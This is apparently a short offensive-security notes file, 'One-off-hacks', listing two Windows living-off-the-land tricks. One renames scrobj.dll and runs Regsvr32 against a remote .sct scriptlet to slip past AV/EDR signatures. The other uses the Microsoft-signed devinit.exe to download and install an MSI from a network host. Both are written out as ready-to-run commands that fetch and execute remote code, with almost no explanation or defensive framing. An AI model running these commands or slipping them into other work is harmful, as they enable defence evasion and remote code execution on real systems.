# One-off-hacks

### Bypass AV/EDR test found [here](https://www.trustedsec.com/blog/discovering-the-anti-virus-signature-and-bypassing-it/) and here at [twitter](https://twitter.com/mrd0x/status/1461041276514623491?s=20)
Bypass steps:
1. copy and renaming scrobj.dll  
`copy c:\windows\system32\scrobj.dll NothingToSeeHere.dll`
2. Test that functionality now by launching calc via:    
`Regsvr32.exe /u /s /i:https://raw.githubusercontent.com/api0cradle/LOLBAS/master/OSBinaries/Payload/Regsvr32_calc.sct
NothingToSeeHere.dll`
---
### MS signed tool with tons of useful commands but needs VS to run properly.  Found here in [twitter](https://twitter.com/mrd0x/status/1460815932402679809?s=20)  
1. Here using `msi-install`, it downloads a msi file to `C:\Windows\Installer\` then installs it.  
2. `devinit.exe run -t msi-install -i http://10.0.0.18/out.msi`
